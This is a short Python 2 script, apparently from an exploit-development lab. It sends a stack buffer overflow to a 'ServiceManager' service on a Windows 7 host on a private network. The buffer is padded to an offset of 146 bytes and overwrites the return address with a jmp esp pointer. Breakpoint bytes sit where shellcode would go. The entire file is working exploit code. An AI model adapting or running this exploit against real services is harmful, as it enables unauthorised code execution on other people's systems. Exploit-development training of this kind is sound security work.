#!/usr/bin/python
import socket
import struct

ServiceManagerIP = "192.168.150.25"
ServiceManagerPort = 42424

ptr_jmp_esp = 0x080414c3

sub_esp_10 = "\x83\xec\x10"

buf_totlen = 400
offset_srp = 146

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "BBBB"
buf += "\xCC\xCC\xCC\xCC"
buf += "D"*(buf_totlen - len(buf))


#Attempt to send message
try:
    print "Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to Win7 machine
    connect = s.connect((ServiceManagerIP, ServiceManagerPort))
    s.send(buf + '\r\n')
    s.recv(1024)
    s.close()
    
except:
    print "Could not connect"
